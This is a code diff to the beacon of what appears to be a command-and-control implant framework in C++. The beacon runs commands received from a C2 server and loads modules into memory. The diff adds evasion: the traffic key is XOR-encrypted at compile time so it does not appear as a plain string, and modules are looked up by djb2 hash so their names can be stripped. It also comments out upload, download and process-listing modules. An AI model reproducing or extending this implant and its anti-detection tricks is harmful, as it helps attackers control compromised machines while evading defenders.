@@ -14,6 +14,13 @@
 #include <wtsapi32.h>
 #include <MemoryModule.h>
 
+// #include "../modules/Upload/Upload.hpp"
+// #include "../modules/Download/Download.hpp"
+// #include "../modules/PrintWorkingDirectory/PrintWorkingDirectory.hpp"
+// #include "../modules/ChangeDirectory/ChangeDirectory.hpp"
+// #include "../modules/ListDirectory/ListDirectory.hpp"
+// #include "../modules/ListProcesses/ListProcesses.hpp"
+
 #define INFO_BUFFER_SIZE 32767
 #define  ENV_VAR_STRING_COUNT  (sizeof(envVarStrings)/sizeof(TCHAR*))
 
@@ -24,6 +31,14 @@ typedef ModuleCmd* (*constructProc)();
 #endif
 
 using namespace std;
+
+
+// XOR encrypted at compile time, so don't appear in string
+constexpr std::string_view _KeyTraficEncryption_ = "dfsdgferhzdzxczevre5595485sdg";
+constexpr std::string_view mainKeyConfig = ".CRT$XCL";
+
+// compile time encryption
+constexpr std::array<char, 29> _EncryptedKeyTraficEncryption_ = compileTimeXOR<29, 8>(_KeyTraficEncryption_, mainKeyConfig);
 
 
 #ifdef __linux__
@@ -97,23 +112,23 @@ Beacon::Beacon(const std::string& ip, int port)
 
 // TODO at some point chose which module are directly included , could be this list:
 
-// 	std::unique_ptr<Upload> upload = std::make_unique<Upload>();
-// 	m_moduleCmd.push_back(std::move(upload));
+	// std::unique_ptr<Upload> upload = std::make_unique<Upload>();
+	// m_moduleCmd.push_back(std::move(upload));
 
-// 	std::unique_ptr<Download> download = std::make_unique<Download>();
-// 	m_moduleCmd.push_back(std::move(download));
+	// std::unique_ptr<Download> download = std::make_unique<Download>();
+	// m_moduleCmd.push_back(std::move(download));
 
-// 	std::unique_ptr<PrintWorkingDirectory> printWorkingDirectory = std::make_unique<PrintWorkingDirectory>();
-// 	m_moduleCmd.push_back(std::move(printWorkingDirectory));
+	// std::unique_ptr<PrintWorkingDirectory> printWorkingDirectory = std::make_unique<PrintWorkingDirectory>();
+	// m_moduleCmd.push_back(std::move(printWorkingDirectory));
 
-// 	std::unique_ptr<ChangeDirectory> changeDirectory = std::make_unique<ChangeDirectory>();
-// 	m_moduleCmd.push_back(std::move(changeDirectory));
+	// std::unique_ptr<ChangeDirectory> changeDirectory = std::make_unique<ChangeDirectory>();
+	// m_moduleCmd.push_back(std::move(changeDirectory));
 
-// 	std::unique_ptr<ListDirectory> listDirectory = std::make_unique<ListDirectory>();
-// 	m_moduleCmd.push_back(std::move(listDirectory));
+	// std::unique_ptr<ListDirectory> listDirectory = std::make_unique<ListDirectory>();
+	// m_moduleCmd.push_back(std::move(listDirectory));
 
-// 	std::unique_ptr<ListProcesses> listProcesses = std::make_unique<ListProcesses>();
-// 	m_moduleCmd.push_back(std::move(listProcesses));
+	// std::unique_ptr<ListProcesses> listProcesses = std::make_unique<ListProcesses>();
+	// m_moduleCmd.push_back(std::move(listProcesses));
 
 
 #ifdef __linux__
@@ -230,8 +245,12 @@ Beacon::Beacon(const std::string& ip, int port)
 		m_privilege = "HIGH";
 
 #endif
-	// TODO put as a param comming from conf
-	m_key="dfsdgferhzdzxczevre5595485sdg";
+	// decrypt key
+    std::string keyDecrypted(std::begin(_EncryptedKeyTraficEncryption_), std::end(_EncryptedKeyTraficEncryption_));
+    std::string key(mainKeyConfig);
+    XOR(keyDecrypted, key);
+
+	m_key=keyDecrypted;
 }
 
 
@@ -584,7 +603,8 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 		m_moduleCmd.push_back(std::move(moduleCmd_));
 
 		std::string msg = "Module loaded successfully:\n";
-		msg += m_moduleCmd.back()->getInfo();
+		msg += inputfile;
+		// msg += m_moduleCmd.back()->getInfo();
 		c2RetMessage.set_returnvalue(msg);
 
 #endif
@@ -594,10 +614,17 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 #ifdef __linux__
 #elif _WIN32
 		std::string moduleName = c2Message.cmd();
+		unsigned long moduleHash = djb2(moduleName);
 
 		std::vector<unique_ptr<ModuleCmd>>::iterator object = 
 			find_if(m_moduleCmd.begin(), m_moduleCmd.end(),
-					[&](unique_ptr<ModuleCmd> & obj){ return obj->getName() == moduleName;}
+					[&](unique_ptr<ModuleCmd> & obj)
+					{ 
+						if(obj->getName().empty())
+							return obj->getHash() == moduleHash;
+						else
+							return obj->getName() == moduleName;
+					}
 					);
 
 		std::string msg = "module not found";
@@ -616,10 +643,12 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 	// Command to be executed by a loaded module
 	else
 	{
+		unsigned long moduleHash = djb2(instruction);
+
 		bool isModuleFound=false;
 		for(auto it = m_moduleCmd.begin() ; it != m_moduleCmd.end(); ++it )
 		{
-			if (instruction == (*it)->getName())
+			if (instruction == (*it)->getName() || moduleHash == (*it)->getHash())
 			{
 				(*it)->process(c2Message, c2RetMessage);
 				isModuleFound=true;
